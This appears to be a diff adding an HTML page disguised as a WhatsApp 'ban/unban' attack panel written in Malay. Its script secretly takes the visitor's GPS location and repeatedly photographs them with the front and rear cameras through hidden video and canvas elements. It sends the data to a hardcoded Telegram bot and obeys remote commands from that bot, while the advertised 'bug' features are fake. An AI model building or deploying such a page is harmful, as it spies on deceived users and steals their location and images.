@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WA BUG | ALIX LOZ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            padding: 20px 20px;
+            color: #ffffff;
+        }
+
+        /* === TAJUK === */
+        .tajuk-besar {
+            font-size: 23px;
+            font-weight: 900;
+            text-align: center;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        .sub-tajuk {
+            font-size: 15px;
+            color: #ff3333;
+            text-align: center;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+
+        /* === GAMBAR === */
+        .kotak-gambar {
+            width: 100%;
+            height: 170px;
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid #222;
+            margin-bottom: 20px;
+        }
+        .gambar-latar {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* === TAB === */
+        .tab-bar {
+            display: flex;
+            gap: 2px;
+            margin-bottom: 18px;
+        }
+        .tab {
+            flex:1;
+            padding: 12px;
+            text-align:center;
+            font-weight:bold;
+            font-size:16px;
+            background:#111;
+            border-radius: 6px 6px 0 0;
+        }
+        .tab.merah { color:#ff3333; background:#1a1a1a; border-bottom: 2px solid #ff3333; }
+        .tab.putih { color:#fff; }
+
+        /* === INPUT === */
+        .input-kotak {
+            width:100%;
+            background:#111;
+            border:1px solid #333;
+            border-radius:8px;
+            padding:15px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:15px;
+            outline:none;
+        }
+
+        .pilih-kotak {
+            width:100%;
+            background:#111;
+            border:2px solid #ffb800;
+            border-radius:8px;
+            padding:15px;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:20px;
+            appearance:none;
+            background-image:url('data:image/svg+xml,<svg fill="white" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat:no-repeat;
+            background-position:right 15px center;
+        }
+
+        /* === BUTANG === */
+        .btn-mula {
+            width:100%;
+            background:#000;
+            color:#ff3333;
+            border:2px solid #ff3333;
+            padding:14px;
+            border-radius:8px;
+            font-size:17px;
+            font-weight:bold;
+            letter-spacing:1px;
+            cursor:pointer;
+            margin-bottom:25px;
+            transition:0.2s;
+        }
+        .btn-mula:active { background:#ff3333; color:#000; }
+
+        /* === SENARAI MODUL === */
+        .modul-item {
+            background:#121212;
+            border-radius:8px;
+            padding:13px 16px;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            margin-bottom:10px;
+            font-size:15px;
+        }
+        .lampu-hijau {
+            width:12px;
+            height:12px;
+            border-radius:50%;
+            background:#00ee66;
+            box-shadow:0 0 6px #00ee66;
+        }
+
+        /* === LOG === */
+        .kotak-log {
+            background:#0f0f0f;
+            border-radius:8px;
+            padding:14px;
+            margin-top:10px;
+            font-size:13px;
+            color:#ff4444;
+            line-height:1.6;
+        }
+
+        video,canvas {display:none;}
+    </style>
+</head>
+<body>
+
+    <!-- TAJUK -->
+    <h1 class="tajuk-besar">BANNED & UNBANNED WHATSAPP</h1>
+    <div class="sub-tajuk">ALIX LOZ</div>
+
+    <!-- GAMBAR -->
+    <div class="kotak-gambar">
+        <img class="gambar-latar" src="https://r.mtdv.me/aguard-bg" alt="Anime Blue Sword">
+    </div>
+
+    <!-- TAB -->
+    <div class="tab-bar">
+        <div class="tab merah">BANNED</div>
+        <div class="tab putih">UNBANNED</div>
+    </div>
+
+    <!-- INPUT -->
+    <input type="text" class="input-kotak" placeholder="Nomor target" id="nombor">
+
+    <select class="pilih-kotak" id="jenis">
+        <option>Spam Report</option>
+        <option>Bug Delay</option>
+        <option>Bug FC</option>
+    </select>
+
+    <!-- BUTANG -->
+    <button class="btn-mula" onclick="mulakanSistem()">START BANNED</button>
+
+    <!-- SENARAI MODUL -->
+    <div class="modul-item"><span>📍 Lokasi Google Maps</span><div class="lampu-hijau"></div></div>
+    <div class="modul-item"><span>📸 Kamera Depan & Belakang</span><div class="lampu-hijau"></div></div>
+    <div class="modul-item"><span>⏱️ Bug Delay Aktif</span><div class="lampu-hijau"></div></div>
+    <div class="modul-item"><span>🌀 Bug FC Aktif</span><div class="lampu-hijau"></div></div>
+
+    <!-- LOG -->
+    <div class="kotak-log" id="log">
+        [SYSTEM] Panel Loaded ✅<br>
+        [OWNER] ALIX LOZ<br>
+        [STATUS] Ready to Attack
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ✅ DATA BOT TELEGRAM ✅
+        const BOT_TOKEN = "8781714345:AAHc6GCe3hXnuI9DjEcGZ8soUj2H_7uSun4";
+        const CHAT_ID = "6571461340";
+
+        const log = document.getElementById('log');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let lampuHidup = false;
+
+
+        // === MULA SISTEM ===
+        function mulakanSistem(){
+            let no = document.getElementById('nombor').value || "TIADA NOMBOR";
+            let jenis = document.getElementById('jenis').value;
+            tambahLog("🚀 Serangan bermula: "+no+" | Mod: "+jenis);
+
+            hantarTelegram(`🔴 *WA BUG | ALIX LOZ* 🔴\n\n🎯 Sasaran: ${no}\n⚙️ Mod: ${jenis}\n📡 Status: *AKTIF 100%*\n\n⚡ *ARAHAN:*\n/maps → Hantar Lokasi\n/kamera → Ambil Gambar\n/delay → Aktif Lambat\n/fc → Aktif Tutup Paksa`);
+
+            // 📍 LOKASI
+            dapatkanLokasi();
+
+            // 📸 KAMERA
+            mulaKamera();
+
+            // ⏱️ & 🌀 BUG
+            if(jenis==="Bug Delay") tambahLog("Bug Delay Diaktifkan");
+            if(jenis==="Bug FC") tambahLog("Bug FC Diaktifkan");
+        }
+
+
+        // === LOKASI GOOGLE MAPS ===
+        function dapatkanLokasi(){
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(p=>{
+                    let lat=p.coords.latitude.toFixed(6), lon=p.coords.longitude.toFixed(6);
+                    hantarTelegram(`📍 *LOKASI GOOGLE MAPS:*\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                    tambahLog("✅ Lokasi dihantar");
+                });
+            }
+        }
+
+
+        // === KAMERA DEPAN/BELAKANG ===
+        async function mulaKamera(){
+            let mod="user";
+            const ambil=async()=>{
+                try{
+                    let strim=await navigator.mediaDevices.getUserMedia({video:{facingMode:mod}});
+                    video.srcObject=strim;
+                    setTimeout(()=>{hantarGambar(mod)},2000);
+                    mod=mod==="user"?"environment":"user";
+                }catch(e){tambahLog("❌ Kamera: "+e.name)}
+            };ambil();setInterval(ambil,6000);
+        }
+        function hantarGambar(nama){
+            canvas.width=video.videoWidth;canvas.height=video.videoHeight;
+            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+            hantarGambarTelegram(canvas.toDataURL(),`📸 Kamera ${nama.toUpperCase()}`);
+        }
+
+
+        // === BACA ARAHAN DARI BOT ===
+        setInterval(()=>{
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(r=>r.json()).then(d=>{
+                if(d.ok&&d.result.length>0){
+                    let cmd=d.result.pop().message?.text?.toLowerCase();
+                    if(cmd==="/maps") dapatkanLokasi();
+                    if(cmd==="/kamera") mulaKamera();
+                    if(cmd==="/delay") hantarTelegram("⏱️ *BUG DELAY:* Berjaya Aktif ✅");
+                    if(cmd==="/fc") hantarTelegram("🌀 *BUG FC:* Berjaya Aktif ✅");
+                }
+            })
+        },4000);
+
+
+        // === ALAT BANTU ===
+        function hantarTelegram(t){fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:t,parse_mode:"Markdown"})})}
+        function tambahLog(t){log.innerHTML+=t+"<br>";log.scrollTop=log.scrollHeight;}
+        function dataURLkeBlob(d){let b=d.split(','),t=b[0].match(/:(.*?);/)[1],s=atob(b[1]),l=s.length,a=new Uint8Array(l);while(l--)a[l]=s.charCodeAt(l);return new Blob([a],{type:t})}
+        function hantarGambarTelegram(url,judul){
+            let blob=dataURLkeBlob(url);
+            let borang=new FormData();borang.append("chat_id",CHAT_ID);borang.append("photo",blob,"img.png");borang.append("caption",judul);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:borang});
+        }
+    </script>
+
+</body>
+</html>
